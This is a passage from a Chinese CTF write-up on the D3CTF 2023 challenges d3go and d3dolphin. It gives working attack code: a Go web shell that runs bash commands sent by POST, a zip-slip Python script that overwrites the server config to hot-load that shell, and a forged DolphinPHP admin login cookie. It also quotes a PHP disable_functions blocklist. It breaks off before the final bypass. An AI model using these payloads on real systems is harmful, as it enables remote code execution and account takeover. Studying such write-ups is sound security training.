class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> upload</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;archive/zip&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/utils&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line"><span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipPath <span class="type">string</span>, outputPath <span class="type">string</span>)</span></span> (*utils.Tree, <span class="type">error</span>) &#123;</span><br><span class="line">r, err := zip.OpenReader(zipPath)</span><br><span class="line"><span class="keyword">defer</span> r.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(outputPath, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">tree := utils.NewTree(filepath.Base(outputPath))</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> r.File &#123;</span><br><span class="line">utils.Paths2Tree(f.Name, path.Join(outputPath, f.Name), tree)</span><br><span class="line">p, _ := filepath.Abs(filepath.Join(outputPath, f.Name))</span><br><span class="line">content, err := f.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">data, err := io.ReadAll(content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(filepath.Dir(p), <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := os.WriteFile(p, data, <span class="number">0750</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">content.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">content.Close()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> tree, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>稍微审一下题，首先在main.go有这么一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段对静态文件做了些处理，他直接就没对../进行处理，导致我们可以任意目录穿越，也就是一开始我们任意文件读取，读取完后再注意一下controller里的这一段</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对应的user.go如上，是一个struct，但是里面有一个字段需要注意</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>给了 gorm.model 就说明自带deletedat字段，也就是有软删除这么一说，软删除也就是非实际删除数据库数据，而是单纯无法查询出来。结合一下上面的源码，我们的目的是以admin登录然后去上传zip文件，因此我们应该软链接先删除一下admin：</p><p>这里的话admin是数据库中的第一个用户</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>然后再创建一个用户</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>之后登录test就是管理员了，因为代码里的逻辑是ID为1的用户就是管理员，那么接下来就好说了，由题目中config.go和main.go可以得知实现了热部署</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就好说了，我们可以覆盖config.yaml实现自更新，以下是chatgpt问答</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">参考boogipop师傅的</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这就是恶意的go文件，把他编译为二进制文件后，还需要准备一个yaml文件</p><p>下面这个是原本的config.yaml文件</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>之后利用zipslip去覆盖文件，因为题目并没有对unzip做处理，所以可以进行任意文件覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##生成的zip文件</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##压缩的文件和在zip中显示的文件名</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>然后将生成的文件上传到服务器上就可以成功rce了</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>提示：</strong></p><p><strong>没有必要蛮力。管理员自从他写日志后就再也没有出现过。</strong></p><p><strong>管理员通过简单地按照 <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> 所说的内容来修补错误</strong></p><p>题目</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>给了个CVE   然后告诉你这里使用了补丁来修复这个CVE</p><p>signin_token 可以很容易地通过提供⽤⼾名、id 和⽤⼾ [last_login_time] 来暴⼒破解</p><p><strong>因为admin的用户密码不知道，于是就去下载源码来进行查看</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>发现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// 判断是否记住登录</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// 自动登录</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据log.txt，admin的last_login_time是2011-04-05 14:19:19，这样我们就可以⽣成⼀个signing_token：</p><p>这里需要的是时间戳  所以<strong>2011-04-05 14:19:19</strong>的时间戳为1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据签名认证</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data 被认证的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> 蔡伟明 &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 数据类型检测</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 排序</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// url编码并生成query字符串</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// 生成签名</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以进行签名的伪造了</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>这里为了避免id和时间戳的混淆，于是这里就可以使用分+号来进行分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// 要计算 SHA-1 哈希的字符串</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// 计算 SHA-1 哈希值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// 输出：ab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成cookie后，就可以进行伪造登录了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>因为这里存在通配符，于是名字就可以这样取</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>添加cookie后就可以成功进行登录了</p><p>这里的版本是v1.5.1，于是可以去查看上一个版本的漏洞，看这个版本修复了啥，然后在通过看官方的修复有没有漏洞，我们可不可以进行绕过</p><p>根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 海豚PHP框架 [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 版权所有 2016~2019 广东卓锐软件有限公司 [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | 官方网站: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 拒绝ie访问</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 模块管理中，不读取模块信息的目录</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// 禁用函数</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>直接去查看官方发布的补丁就行了</p><p>CVE-2023-0935 是使⽤ shell_exec 绕过 CVE-2021-46097 2. 根据<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ，Dolphinphp v1.5.0存在RCE漏洞，作者通过简 单添加函数⿊名单的⽅式对其进⾏了修补。 然后使⽤登录管理⻔⼾ 在这个挑战中，shell_exec 被添加到 system.php 中的 disable_functions，以及 php.ini 下⾯的其他函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,ini_alter,ini</span><br><span class="line">_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_waitp</span><br><span class="line">id,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_w</span><br><span class="line">exitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal_dispatch,pcntl_get_last_er</span><br><span class="line">ror,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_</span><br><span class="line">getpriority,pcntl_setpriority,imap_open,apache_setenv,putenv</span><br></pre></td></tr></table></figure><p>我们的⽬标是基于 CVE-2021-46097 再次绕过它</p><p>这里的话就是个小0day了，得自己挖利用链了  